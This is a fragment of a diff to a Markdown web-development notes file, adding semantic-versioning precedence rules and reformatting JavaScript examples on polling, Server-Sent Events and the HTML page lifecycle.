+   1. Identifiers consisting of letters and hyphens are compared lexically in ASCII order.
+   1. Numeric identifiers has lower precedence than non-numeric identifiers.
+   ```txt
+   1.0.0-alpha < 1.0.0-alpha.1 < 1.0.0-alpha.beta < 1.0.0-beta < 1.0.0-beta.2 < 1.0.0-beta.11 < 1.0.0-rc.1 < 1.0.0
+   ```
 
 Sematic versioning makes it easy to upgrade denpendent packages freely as long as _major_ version is the same.
 
@@ -1013,12 +888,10 @@ Polling uses `setInterval` to sent events every period of time. It has drawbacks
 
 ```javascript
 setInterval(() => {
-    $.ajax({
-        url: 'http://www.example.com',
-        success: function() {
-
-        }
-    })
+  $.ajax({
+    url: 'http://www.example.com',
+    success: function () {},
+  })
 }, 3000)
 ```
 
@@ -1037,15 +910,15 @@ Long polling improves polling by not returning empty response when there's no up
 ```javascript
 // clients
 let source = new EventSource('/user-log-stream')
-source.onmessage = function(event) {
-    let message = event.data
-    // do something
+source.onmessage = function (event) {
+  let message = event.data
+  // do something
 }
 
 // server
 ```
 
-1. [SSE vs WebSocket]( https://www.ibm.com/developerworks/cn/web/wa-http-server-push-with-websocket-sse/index.html)
+1. [SSE vs WebSocket](https://www.ibm.com/developerworks/cn/web/wa-http-server-push-with-websocket-sse/index.html)
 
 ### HTML Page Lifecycle
 
@@ -1059,7 +932,6 @@ document.readyState
 1. window.onload event
 1. window.onbeforeunload
 1. window.onunload
-
 
 async scripts are executed(in download order) in anytime before load event when download complete
 
